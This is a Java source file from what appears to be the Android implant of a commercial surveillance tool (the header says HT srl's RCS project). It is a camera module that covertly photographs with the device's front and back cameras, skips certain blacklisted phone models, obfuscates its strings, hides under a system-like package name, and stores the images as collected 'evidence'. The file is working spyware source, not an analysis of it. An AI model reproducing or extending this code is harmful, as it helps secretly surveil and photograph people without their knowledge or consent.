/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : CameraAgent.java
 * Created      : Apr 18, 2011
 * Author		: zeno
 * *******************************************/

package com.android.dvci.module;

import android.content.pm.PackageManager;
import android.hardware.Camera;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;

import com.android.dvci.Status;
import com.android.dvci.ThreadBase;
import com.android.dvci.auto.Cfg;
import com.android.dvci.conf.ConfModule;
import com.android.dvci.evidence.EvidenceBuilder;
import com.android.dvci.evidence.EvidenceType;
import com.android.dvci.manager.ManagerModule;
import com.android.dvci.module.camera.CameraSnapshot;
import com.android.dvci.util.Check;
import com.android.dvci.util.Utils;
import com.android.mm.M;

import java.io.IOException;
import java.util.concurrent.Callable;
import java.util.concurrent.TimeUnit;

//MANUAL http://developer.android.com/guide/topics/media/camera.html

/**
 * The Class ModuleCamera.
 */
public class ModuleCamera extends BaseInstantModule {

	private static final String TAG = "ModuleCamera"; //$NON-NLS-1$

	int counter = 0;
	private String[] backlistedPhones = {
			M.e("LG-D405")
	};

	public static ModuleCamera self() {
		return (ModuleCamera) ManagerModule.self().get(M.e("camera"));
	}


	//private boolean face;

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#parse(byte[])
	 */
	@Override
	public boolean parse(ConfModule conf) {

		//boolean force = conf.getBoolean("force", false);
		//face = conf.getBoolean("face", false);
		clearStop();
		return Status.self().haveCamera();
	}

	@Override
	public void actualStart() {
		try {

/*			if (ModuleCall.self() != null && ModuleCall.self().isRecording()) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (actualStart), call recording, cannot get snapshot");
				}
				return;
			}*/

			if(haveStops()){
				return;
			}
			for ( String model: backlistedPhones) {
				if (Build.MODEL.equalsIgnoreCase(model)) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (actualStart): Phone: " + Build.MODEL + " not supported");
					}
					addStop(Status.STOP_REASON_PHONE_MODEL);
					return;
				}
			}
			if(CameraSnapshot.self().getCamera_killed() <= CameraSnapshot.MAX_CAMERA_KILLS) {
				snapshot();
			}

		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (actualStart) Error: " + e);
			}
		}
	}



	/**
	 * Snapshot.
	 *
	 * @throws IOException
	 */
	private void snapshot() throws IOException {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (snapshot)");
		}
		counter++;

		if (Build.VERSION.SDK_INT > Build.VERSION_CODES.HONEYCOMB) {
			final CameraSnapshot camera = CameraSnapshot.self();

			if (Status.self().semaphoreMediaserver.tryAcquire()) {
				try{
					camera.snapshot(Camera.CameraInfo.CAMERA_FACING_FRONT);
				} finally {
					Status.self().semaphoreMediaserver.release();
				}
			}
			Utils.sleep(100);
			if (Status.self().semaphoreMediaserver.tryAcquire()) {
				try{
					camera.snapshot(Camera.CameraInfo.CAMERA_FACING_BACK);
				} finally {
					Status.self().semaphoreMediaserver.release();
				}
			}

		}

	}

	public static void callback(byte[] bs) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (callback), bs: " + bs.length);
		}
		EvidenceBuilder.atomic(EvidenceType.CAMSHOT, null, bs);
	}

}
